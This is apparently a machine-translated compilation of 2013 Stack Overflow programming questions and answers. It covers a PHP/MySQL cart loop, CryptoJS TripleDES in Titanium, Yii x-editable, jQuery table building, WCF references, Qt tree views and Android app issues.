JsonMarshaller 是一个 Java 1.5 库，它允许将 JSON 对象编组和解组到 Java 对象。该项目的目标首先是易用性、透明性和静态类型安全。例子

如果您有以下 Java 类：

爪哇：

```
@Entity
class Book {
@Value
  private String title;
@Value
  private String isbn;
@Value
  private Set<author> authors;
}

@Entity
class Author {
@Value
  private String firstName;
@Value
  private String lastName;
} 
```

你创建了一个新的 Book() 并用它可以编组的信息填充它：

```
JSON:

{title:   "java",
 isbn:    "122333",
 authors: [{firstName: "Herbert", lastName: "Shield"},
           {firstName: "Pascal",  lastName: "Perez"}]} 
```

# php - 在 php for 循环中只显示 mysql 数据库中的一行？

> ID：15357372
> 
> 赞同：1
> 
> 时间：2013-03-12T09:22:11.180
> 
> 标签：php, mysql, database, select

在 php forloop中`forloop`只显示 mysql`row`数据库中的一行？`for loop repeat that size row again and again``new product is entered?`

**页面功能**

```
 <?php
if(is_array($_SESSION['cart'])){
echo '<tr bgcolor="#FFFFFF" style="font-weight:bold"><td align="center"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Item Code</font></td><td align="center"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Product Name</font></td>
<td align="center"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Product Image</font></td>
<td><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Price</font></td>
<td><div><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Size</font></div></td>
<td><font style="font-family:Arial,Helvetica,sans-serif;  font-size:14px; color:#000;">Options</font></td></tr>';

 $max=count($_SESSION['cart'] );
 for($i=0;$i<=$max;$i++){
 $id=$_SESSION['cart'][$i]['id'];
 $q=$_SESSION['cart'][$i]['qty'];
 $product=get_product_name($id);
 $image=get_product_image($id);
 $ids=get_id($id);
 $itemcode=get_itemcode($id);
 $size=get_size($id);
 if($q==0) continue;

 ?>
 </table>

 <diiv style="float:left; margin-left:42px;"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:15px; color:#000;">
 <?php echo $itemcode; ?>
 <input type="hidden" name="itemcode[]" value="<?php echo $itemcode?>" /></font></div><br />

 <div style="float: left;margin-left: 122px; margin-top: -14px;"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:15px; color:#000;">
 <?php echo $product?>
 <input type="hidden" name="product[]" value="<?php echo $product?>" /></font></div><br />

<div style="float: left;margin-left: 387px;margin-top: -24px;"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:15px; color:#000;">
<img name="image" id="image" src="admin/uploads/small0_<?php echo $image?>" width="150" height="150">
<input type="hidden" name="image[]" id="image"  value="<?php echo $image?>"  /> </font></div><br />

<div style="float: left;margin-left: 548px;margin-top: -147px;"><font style="font-family:Arial,Helvetica,sans-serif;  font-size:15px; color:#000;">
<?php echo get_price($id) ?>
<input type="hidden" name="price[]" id="price" value="<?php echo get_price($id)?>" /></font></div><br />

<?php //foreach ($size as $sizes) { ?>
<div style="float: left;margin-left: 625px;margin-top: -149px;"><font style="font-family:Arial,Helvetica,sans-serif;font-size:15px; color:#000;">
<?php echo $size; ?> 
</font><input type="hidden" name="size" value="<?php echo $size; ?>" /></font></div><?php //}?><br />

<div style="float: left;margin-left:686px;margin-top: -150px;"><a href="javascript:del(<?php echo $id?>)">
<input type="button" class="button5" value="Remove" /></a></div><br /> 
<hr style="width:800px" />  

<?php                   
}
?>

 <?php
 }
 else{
 echo "There are no items in your shopping cart!";
 }
 ?> 
```

**尺寸查询**

```
function get_size($id){
$result=mysql_query("SELECT size FROM mywishlist order by id") or die("My Wish Size Problem"."<br/><br/>".mysql_error());
while($row=mysql_fetch_array($result)){
return $row['size'];
}}

 function get_size($id){
 $result=mysql_query("SELECT size FROM mywishlist Where pid='$id'") or die("My Wish   Size Problem"."<br/><br/>".mysql_error());
 while($row=mysql_fetch_array($result)){
 return $row['size'];
}} 
```

**Mywishlist 表格截图** ![现在看到尺寸列中有两种尺寸](../Images/f9e44ddd167902e0d567fbbce9eef2c3.png)

**页面截图** ![页面截图](../Images/080d12debbc9cc6189697e46e91e61f1.png)

**当我使用这个功能时**

```
function get_size($id){

$result=mysql_query("SELECT size FROM mywishlist order by id") or die("My Wish Size Problem"."<br/><br/>".mysql_error());

while($row=mysql_fetch_array($result)){
 $size[] = $row['size'];
}

return $size;

}

 <?php foreach ($size as $sizes) { ?>
<div style="float: left;margin-left: 625px;margin-top: -131px;">
<font style="font-family:Arial,Helvetica,sans-serif;font-size:15px; color:#000;">
<?php echo $sizes; ?> 
<font><input type="hidden" name="size" value="<?php echo $size; ?>" />
</font></div><?php }?><br /> 
```

**使用 Array & Foreach 循环后的结果**

![在此处输入图像描述](../Images/5836d4b6b9dbadda0582a79d52a332da.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:25:17.553

将您的功能更改为：

```
function get_size($id){

$result=mysql_query("SELECT size FROM mywishlist order by id") or die("My Wish Size Problem"."<br/><br/>".mysql_error());

while($row=mysql_fetch_array($result)){
 $size[] = $row['size'];
}

return $size;

} 
```

因为在您的函数中，您只返回了第一行并且 return 终止了 while 循环。

# javascript - 在 Titanium 移动项目中使用“CryptoJS”库来解密文本消息 [Triple DES]

> ID：15357375
> 
> 赞同：0
> 
> 时间：2013-03-12T09:22:14.137
> 
> 标签：javascript, cryptography, titanium, tripledes

我有一条加密的短信，我想使用链接上发布的“crypto-js”库对其进行解密：[http ://code.google.com/p/crypto-js/](http://code.google.com/p/crypto-js/)

我想使用 TRIPLE DES 解密。我下载了库并将“tripledes.js”放在我项目的“lib”文件夹下。我正在调用函数以这种方式解密：

```
var lib_decrypt = require('tripledes');
var message = lib_decrypt.DES.decrypt(Ti.Utils.base64decode(thetext), "secretphrase");
alert(message); 
```

我总是收到此错误：“无法调用未定义的方法'解密'”。

我检查了“tripledes.js”代码，真诚地认为它是一个大库，所以我没有找到如何使用这个库来解密我在 Titanium 中的文本的解决方案。

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T18:08:08.067

也许错误是您的对象是否尝试创建“三重奏”的实例或对象

```
 var decode = require('tripledes');
 var test = new decode();
 var message = test.DES.decrypt(Ti.Utils.base64decode(thetext), "secretphrase"); 
```

您是否还检查过 Tripledes.js 与 Titanium 中的 CommonJS 模块是否一致？ [https://wiki.appcelerator.org/display/guides/CommonJS+Modules+in+Titanium](https://wiki.appcelerator.org/display/guides/CommonJS+Modules+in+Titanium)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T07:11:17.823

出现问题是因为我错过了在“tripledes.js”中导出“CryptoJS”。所以当我把“exports.CryptoJS = CryptoJS;” 在“tripledes.js”中，一切正常，因为所有 Tripledes 库函数都与“CryptoJS”的实例相关

# php - x-editable for yii 不会让我编辑字段

> ID：15357376
> 
> 赞同：2
> 
> 时间：2013-03-12T09:22:17.157
> 
> 标签：php, yii, jeditable

我安装了扩展 x-editable-yii 并尝试使用它。看起来比较简单：

```
<?php
$modelPersoonHasStdTaak = PersoonHasStdTaak::model()->findByPk(array('idPersoon' => 5, 'idPlanning' => 5, 'idStdActiviteit' => 4, 'idStdTaak' => 7));

echo $this->widget('editable.EditableField', array(
    'type' => 'select',
    'model' => $modelPersoonHasStdTaak,
    'attribute' => 'idPersoon0',
    'url' => $this->createUrl('persoonhasstdtaak/updatepersoonhasstdtaak'),
    'source' => CHtml::listData(Persoon::model()->findAll(), 'idPersoon', 'Naam'),
    'placement' => 'right',
        ), true);
?> 
```

`PersoonHasStdTaak`是一个调度规则，它包含`idPerson`作为变量和 PK( `idSchedule`, `idStdActivity`, `idTask`) （翻译成英文）。

它应该显示的是一个可编辑字段，如[http://x-editable.demopage.ru/index.php?r=site/widgets#EditableField](http://x-editable.demopage.ru/index.php?r=site/widgets#EditableField)（编号 3: `Select`）所示。

`safe`我在`rules()`但仍然创建了 idPerson 的属性：

```
The output is nothing but one line with a name. NOT the supposed editable field 
```

如何使它正常工作？

# javascript - 使用两个 JSON 填充表

> ID：15357380
> 
> 赞同：0
> 
> 时间：2013-03-12T09:22:19.857
> 
> 标签：javascript, jquery, json, tabular

我想用两个 JSON 创建表。我可以在普通 JSON 中设置字段，但这些更复杂。你能给我一个想法吗？

这是我的json：

```
 {
  "ParentId": "00000000-0000-0000-0000-000000000000",
  "UserGroupModel": null,
  "EntityAccessData": [
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "68c59596-12b5-4044-bd8c-2f754c44466f",
      "EntityTitle": "Message",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "8626c003-c3cb-4074-b3ff-6385b4d9e90e",
        "Title": "Can read"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "62b71a6e-6e74-4a8c-b6cb-f5ad21278e4f",
      "EntityTitle": "Message",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "e3b29357-8018-4438-88d5-7e80117aefc2",
        "Title": "Can add"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "7e99490b-4073-406d-a617-ce4c9014f3d4",
      "EntityTitle": "Message",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "b300e4f0-85bc-43ac-a50c-be3e7b288012",
        "Title": "Can delete"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "dde7e245-57d5-492d-b2c4-7ca9a55c6a41",
      "EntityTitle": "Message",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "d1310106-bb55-4cdf-a113-f8818b496588",
        "Title": "Can edit"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "88494116-cc2b-4028-9940-a8cf5d645602",
      "EntityTitle": "User",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "2f6744e2-a8fb-45b1-a67c-38f23def4149",
        "Title": "Can read"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "d1a6aaf2-b159-461a-8c9f-be9125cb683f",
      "EntityTitle": "User",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "a13677ea-fee3-4708-94e7-b0907ade304c",
        "Title": "Can add"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "112086ed-6a4f-47c0-8f16-9b56f37bda80",
      "EntityTitle": "User",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "aa283b4b-393e-4da5-a3c3-ba92a1b460a6",
        "Title": "Can edit"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "5f09c8f5-ff9d-4890-bcf9-9820fab5997f",
      "EntityTitle": "User",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "59d0c6f7-8f93-497a-854d-bdd4a42ade94",
        "Title": "Can delete"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "c206663f-a81f-437f-8213-99b2df7b5b7c",
      "EntityTitle": "Category",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "c5e672b5-e306-4181-ae37-93b50fb7bf20",
        "Title": "Can add"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "6a3546c0-b7e9-4a65-8033-801ee867be5f",
      "EntityTitle": "Category",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "3724d57c-b0e9-47a0-9eef-cb690f7c4837",
        "Title": "can read"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "636fac3f-9f53-47bd-9b46-af6d0e80366d",
      "EntityTitle": "Category",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "76e6b578-cb3a-4055-a582-e7269e46184b",
        "Title": "Can edit"
      },
      "Category": null,
      "HasAccess": null
    },
    {
      "Id": null,
      "Title": null,
      "EntityAccessDataId": "757036a8-aea8-4151-a5e1-618352f9bcab",
      "EntityTitle": "Category",
      "SiteId": "1294900c-d8d9-4357-b698-001cbeac0231",
      "SiteTitle": "MYWEBSITE",
      "UserGroupId": "00000000-0000-0000-0000-000000000000",
      "UserGroupTitle": null,
      "Access": {
        "Id": "336f6f9b-c69a-4578-8b1e-f52442555000",
        "Title": "Can delete"
      },
      "Category": null,
      "HasAccess": null
    }
  ]
} 
```

下拉列表的项目将来自此 json

```
[
  {
    "Title": "-"
  },
  {
    "Title": "Yes"
  },
  {
    "Title": "No"
  }
] 
```

我怎样才能创建这样的表：

这是我的目标：

```
|---------------Title---------------|-------------------ID---------------|-----Access-----|
___________________________________________________________________________________________
|Message-----------------------------------------------------------------|-----------------
|can read---------------------------|8626c003-c3cb-4074-b3ff-6385b4d9e90e|-----DROPDOWN---|
|can add----------------------------|e3b29357-8018-4438-88d5-7e80117aefc2|-----DROPDOWN---|
|can delete-------------------------|b300e4f0-85bc-43ac-a50c-be3e7b288012|-----DROPDOWN---|
|can edit---------------------------|d1310106-bb55-4cdf-a113-f8818b496588|-----DROPDOWN---|
___________________________________________________________________________________________
|User--------------------------------------------------------------------|-----------------
|can read---------------------------|2f6744e2-a8fb-45b1-a67c-38f23def4149|-----DROPDOWN---|
|can add----------------------------|a13677ea-fee3-4708-94e7-b0907ade304c|-----DROPDOWN---|
|can edit---------------------------|aa283b4b-393e-4da5-a3c3-ba92a1b460a6|-----DROPDOWN---|
|can delete-------------------------|59d0c6f7-8f93-497a-854d-bdd4a42ade94|-----DROPDOWN---|
___________________________________________________________________________________________
|Category----------------------------------------------------------------|-----------------
|can read---------------------------|c5e672b5-e306-4181-ae37-93b50fb7bf20|-----DROPDOWN---|
|can add----------------------------|336f6f9b-c69a-4578-8b1e-f52442555000|-----DROPDOWN---|
___________________________________________________________________________________________ 
```

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:03:14.610

将带有标题的文档添加`<table id="tableID">`到您的文档中，并将生成的附加`<tr>`到它..

说你json是数据

试试这个

```
 var tempArray=[];
  var tableRow="";
 $.each(data.EntityAccessData,function(i,val){
     if(jQuery.inArray(val.EntityTitle, tempArray) == -1){
          tempArray.push(val.EntityTitle);
          var tableRow += '<tr><td>'+ val.EntityTitle  +'</td></tr>' 
     }else{
          var tableRow += '<tr><td>'+ val.Access.Id+'</td>'+'<td>'+val.Access.Title+'</td></tr>' 
     }
 })
 $('#tableID').append(tableRow); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:27:33.240

看看[KnockoutJS](http://knockoutjs.com/)。您可以将 JSON 数组加载到一个`observableArray`（如果您需要对其执行 CRUD 操作很方便）并使用自定义`data-bind`属性在 a 中显示您的数据。

# wcf - “添加参考”和“添加服务参考”有什么区别？

> ID：15357382
> 
> 赞同：1
> 
> 时间：2013-03-12T09:22:23.993
> 
> 标签：wcf, visual-studio, service-reference

我有`C#/WCF`服务。我在为其添加服务引用时[遇到](https://stackoverflow.com/questions/15270680/add-service-reference-when-using-nettcp-binding) [问题](https://stackoverflow.com/questions/15338163/service-has-zero-application-non-infrastructure-endpoints)，因此我的一位同事建议我只需使用库添加对它的引用。

[这里](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/758f5253-8262-4e29-b57f-c56a7b3023df)的第二个答案表明，这样做我失去了服务的可重用性。
那是对的吗？这些选项之间还有其他区别吗？

**编辑**
我没有使用 WCF 的经验。我正在根据[本](http://wcftutorial.net/)教程工作，请在您的答案中提供一些解释（或链接）。

**编辑 2**
我想要一个 Windows 托管的 WCF 服务，它将在运行我的主应用程序的每台机器上运行。我的应用程序（和另一个）将仅在本地使用此服务。
我仍然可以通过“添加参考”实现这一目标吗？

**编辑 3**
我需要一项服务，因为我有两个不同的应用程序正在做同样的事情，并且他们需要硬件资源。目前，其中一个正在使用另一个的 dll，因此不会复制和粘贴代码（至少），但是没有办法阻止对这些资源的并发访问。Windows 服务可以解决这个问题。
绑定不是太重要。我将进一步了解命名管道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:39:24.673

当您使用添加服务引用时，Visual Studio 使用 svcutil.exe 创建客户端代理（以及另外的 web.config 或 app.config 文件） - 特殊类，用于描述服务器端的方法（服务合同）。当你知道这个合约并且你有适当的配置时 - 你可以从服务器服务远程调用这些方法。

当您使用添加引用时 - 您只需添加一个新库，您可以使用它来处理在那里实现的类、接口、方法。如果您在 dll 中有服务合同类，则可以使用它，而不是使用 svcutil.exe 创建它。但是你必须配置它的设置（绑定和地址）

**编辑 1**有许多创建 WFC 服务的示例。请参阅[http://www.codeproject.com/Articles/42643/Creating-and-Consuming-Your-First-WCF-Service](http://www.codeproject.com/Articles/42643/Creating-and-Consuming-Your-First-WCF-Service)或[http://www.codeproject.com/Articles/412363/How-to-Use-a -WCF-Service-without-Adding-a-Service](http://www.codeproject.com/Articles/412363/How-to-Use-a-WCF-Service-without-Adding-a-Service)。和你想要的解释？您只需要制作合同（您使用方法进行分类），将其链接到您的客户端和服务器应用程序并定义正确的绑定，它描述了如何在它们之间向您发送合同数据

**编辑 2**很难说，在不知道应用程序目的的情况下必须使用什么。因此，是的，您可以使用本地 Windows 服务在那里托管 wcf 服务。存在一种特殊类型的 WCF 服务，称为 NamedPipe - 本地托管服务。有关说明，请参阅[http://msdn.microsoft.com/en-us/library/system.servicemodel.netnamedpipebinding.aspx](http://msdn.microsoft.com/en-us/library/system.servicemodel.netnamedpipebinding.aspx) ，有关实施，请参阅[http://msdn.microsoft.com/en-us/library/ms733069.aspx](http://msdn.microsoft.com/en-us/library/ms733069.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:31:03.650

`Add reference`是添加对 dll、exe 等的引用

`Add service reference`为某些服务创建代理类

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:45:56.460

添加引用用于消费项目中的dll或exe文件，而添加服务引用用于添加消费服务。添加服务引用将在项目中创建代理

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:51:48.357

您的主应用程序在每台客户端计算机上运行，​​而您的 WCF 服务在服务器上运行。您不会在每个客户端上运行 WCF 服务，这是没有意义的。

所以你通常会：

*   创建客户端应用程序
*   创建 WCF 服务
*   将客户端应用程序中的服务引用添加到 WCF 服务

部署：

*   将您的客户端应用程序部署到每台想要使用它的客户端计算机
*   将您的 WCF 服务部署到一台或多台服务器计算机

# jquery - 不调用在head中编写jquery函数

> ID：15357384
> 
> 赞同：3
> 
> 时间：2013-03-12T09:22:39.287
> 
> 标签：jquery

我已经复制了相同的示例表单[jquery](http://api.jquery.com/change/)网站来实现`change()`jQuery 中的功能。如果`<script>..</script>`剪切并粘贴在头部，则在更改选择值时根本不会调用该函数。有什么理由我应该在选择下面写这个片段吗？[这](http://jsfiddle.net/95kKP/)是我将`<script>`零件放在标题中的小提琴。默认代码是[这个](http://jsfiddle.net/8MQwR/)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:27:37.653

我怀疑你的问题是你的 DOM 还没有准备好。在 jQuery 中使用 DOM 时，应该绑定`document`元素的[`ready()`](http://api.jquery.com/ready/)函数，如下所示：

```
$(document).ready(function() {  
    // execute your code here.
}); 
```

或者，您可以使用快捷功能，如下所示：

```
$(function() {  

}); 
```

对于您的示例，如下更新您的代码`head`应该有效：

```
<script type="text/javascript">
$(function() { 
    $('#select_id').change(function() {  
        // handle the change event
    });
});
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:24:21.813

尝试使用以下方法围绕该功能（仍在头脑中）：

```
$(document).ready(function(){

   //Your code here

}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:27:11.753

如果将脚本放在 head 块中，则页面在执行之前可能尚未完成加载。jquery 有一个机制来处理这个问题，即在文档准备好时运行脚本。这是按如下方式完成的：

```
$(document).ready(function(){

   $('.target').change(function() {  alert('Handler for .change() called.');});

}); 
```

文档完全加载后，将调用 ready 函数中的任何代码。几乎我所有的 jquery 代码都以这种方式调用。

# android - 按下 HOME 按钮后，应用程序启动应用程序主活动的新实例

> ID：15357390
> 
> 赞同：3
> 
> 时间：2013-03-12T09:23:00.203
> 
> 标签：android, android-homebutton

我已经准备好 MyApp，现在我看到了这个错误，当我安装应用程序时，它会显示启动屏幕，然后移动到第二个活动等等。现在，当我单击`HOME`按钮并再次启动应用程序时，它从头开始，而不是从哪里开始我已经离开了，只有当我从 Eclipse 安装应用程序时才会发生这种情况，并且我注意到在应用程序从头开始重新启动后，当我单击返回时，我可以看到我之前离开的那个活动？

我查看了以下链接：

[https://code.google.com/p/android/issues/detail?id=14262](https://code.google.com/p/android/issues/detail?id=14262)

[当以不同的意图启动活动时如何防止活动的多个实例](https://stackoverflow.com/questions/4341600/how-to-prevent-multiple-instances-of-an-activity-when-it-is-launched-with-differ/)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-12T10:07:50.647

我认为这是Android中的一个错误。

请执行以下步骤。

1）删除您的应用程序并重新安装它。

2）安装应用程序后，它将显示两个选项“完成”和“打开”点击完成按钮。

3) 现在从应用程序菜单打开应用程序。你的问题将得到解决。

每当按下 HOME 按钮时，应用程序将从其离开的状态开始。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T09:58:01.117

如果您多次重新启动相同的活动，请使用`intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)`或其他适用的 Intent 标志以及`finish()`您的活动（如果活动链中不需要它们）。您还可以使用`onKeyDown`和明确控制活动的存在来控制您的后退按钮。

# javascript - 漂亮的 JSON 格式

> ID：15357391
> 
> 赞同：1
> 
> 时间：2013-03-12T09:23:00.487
> 
> 标签：javascript, json

我想`<span>`在打印精美的 JSON 输出中添加一些数字。

我正在使用`JSON.stringify()`替换*器*来执行此操作。但是，由于带有 span in 的 HTML 片段的返回类型是字符串，这些现在被引用。

如何在数字周围放置跨度？

一个例子：

```
JSON.stringify(
    {
        with_span:1,
        without_span:1
    },
    function(key,value) {
        if(key=="with_span")
            return '<span>'+value+'</span>'; // but I don't want this quoted! :(
        return value;
    },
    4) // the indent 
```

输出：

```
{
    "with_span": "1",
    "without_span": 1
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:02:30.887

[从json2](https://github.com/douglascrockford/JSON-js/blob/master/json2.js) （公共领域 - 不受版权保护）中获取 stringify() 函数并将其修改为输出格式化的 HTML。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T10:14:41.493

这是不可能的`JSON.stringify()`。

`JSON.stringify()`将返回一个有效的 JSON 字符串，并且没有引号它不是一个有效的 json 字符串。

要实现您想要的，您必须自己遍历对象并将其呈现为 HTML。

I don't know your use case, but maybe you could just use a library to do the work? For example [google-code-prettify](https://code.google.com/p/google-code-prettify/).

# c++ - QT 自定义树视图

> ID：15357392
> 
> 赞同：1
> 
> 时间：2013-03-12T09:23:01.393
> 
> 标签：c++, qt, qt4, treeview

我有如下数据表示：

* * *

*   --+ 父母（0:0）
    *   ----+儿童1(1:1)
    *   *   ----+儿童11 (2:2)
    *   ----+儿童(1:n)

* * *

我正在使用 QT 树视图和自定义模型并尝试显示它。我的要求是，与孩子相比，父母需要在不同的列中。

如果父 col:row 为 0:0。子 col:row 应该是 1:1。此外，孩子的孩子可以将 col:row 设置为 2:2

据我阅读 Qt 论坛，没有简单的方法可以做到这一点。它说我必须基于 Qt 树视图来实现我的自定义视图。这是唯一的方法吗？是否有示例说明如何实现自定义树状视图以供参考？我在 Linux（Ubuntu 12）上使用 Qt 4.7 非常感谢任何帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:08:40.583

我不认为你可以修改树视图显示行为而不子类 QTreeView。另一种方法是实现 QAbstractProxyModel 将您的自定义模型映射到新的代理模型，根据树级别将自定义模型中的每个索引映射到代理模型中的不同列。我认为后一种方法更容易，因为您已经熟悉实现自定义模型而不是 QTreeView。

看看这里的文档：http: [//qt-project.org/doc/qt-4.8/qabstractproxymodel.html](http://qt-project.org/doc/qt-4.8/qabstractproxymodel.html)

# android - 文件上传在模拟器中工作，但在设备中不工作

> ID：15357399
> 
> 赞同：2
> 
> 时间：2013-03-12T09:23:20.770
> 
> 标签：android, wcf

我正在使用多部分和流将图像文件上传到我的实时服务器（WCF 服务）。图像大小为 500-700KB，当我使用真实相机时。从模拟器成功上传示例，但是当我将它安装到我的索尼爱立信 Arc S 时，应用程序没有上传任何图像。有用于检查状态代码的代码，但没有任何反应，没有错误，没有异常，没有服务器响应。在我的手机中，我正在使用移动数据连接（提供商 Grammen Phone，GSM，孟加拉国）。不明白是什么问题。有谁能够帮我？

安卓代码：

```
 HttpPost httppost = new HttpPost(SERVICE_URI + "/uploadImage");
                DefaultHttpClient httpclient = new DefaultHttpClient();
                File dir = Environment.getExternalStorageDirectory();
                File imageFile = new File(dir, getImagepath(directoryName, false));     
                if (imageFile.exists()) {
                  MainActivity.this.runOnUiThread(new Runnable() {
                        public void run() {
                            Toast.makeText(MainActivity.this, "File Exist", Toast.LENGTH_SHORT)
                                    .show();
                        }
                    });

                    MultipartEntity entity = new MultipartEntity();
                    entity.addPart("image", new FileBody(imageFile, "image/jpeg"));
                    httppost.setEntity(entity);

                    HttpResponse response = httpclient.execute(httppost);
                    StatusLine statusLine = response.getStatusLine();
                    final int statusCode = statusLine.getStatusCode();

                    if (statusCode == 200) {
                         MainActivity.this.runOnUiThread(new Runnable() {
                                public void run() {
                                    Toast.makeText(MainActivity.this, "Upload successful!", Toast.LENGTH_SHORT)
                                            .show();
                                }
                            });
                    } else {
                         MainActivity.this.runOnUiThread(new Runnable() {
                                public void run() {
                                    Toast.makeText(MainActivity.this, "File Upload Failed,status:"+statusCode, Toast.LENGTH_SHORT)
                                            .show();
                                }
                            });
                    }
                } else {
                     MainActivity.this.runOnUiThread(new Runnable() {
                            public void run() {
                                Toast.makeText(MainActivity.this, "File dont't exist", Toast.LENGTH_SHORT)
                                        .show();
                            }
                        });
                } 
```

**更新：** 我在生成日志文件的异常捕获块中添加了一个日志写入器。“连接到 xxxx：xxxx 被拒绝”，所以很明显它正在获取异常并且它来自服务器端。但仍然不知道有什么问题。

**更新：** 最后，我遇到了问题！这是我在服务器端的“多部分解析器”，我在 android 代码中使用了错误的 ServiceURi。你必须小心选择你需要的解析器。我对我的解析器文件做了一些修改，它的工作原理！但是仍然需要修改解析器，因为需要合并很多其他人员。无论如何，感谢您的努力！有用的链接：[http ://www.ideatoappster.com/android-to-wcf-streaming-multi-part-binary-images/](http://www.ideatoappster.com/android-to-wcf-streaming-multi-part-binary-images/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:36:56.013

使用这个方法将 Uri 路径转换为字符串

```
public String getImagepath(Uri uri) {
        String[] largeFileProjection = { MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.DATA };
        String largeFileSort = MediaStore.Images.ImageColumns._ID + " DESC";
        Cursor myCursor = this.managedQuery(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                largeFileProjection, null, null, largeFileSort);
        String largeImagePath = "";
        try {
            myCursor.moveToFirst();
            largeImagePath = myCursor
                    .getString(myCursor
                            .getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATA));
        } finally {
            myCursor.close();
        }
        return largeImagePath;
    }

public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);

        switch (requestCode) {
                 case PICK_FROM_CAMERA:
            if (resultCode == Activity.RESULT_OK) {
                   Uri  mImageCaptureUri = intent.getData();

                Bitmap bitmapImage = (Bitmap)intent.getExtras().get("data");
                         }
} 
```

用于获取此 Uri onActivityResult 的字符串路径

调用这个 getImagepath(mImageCaptureUri )

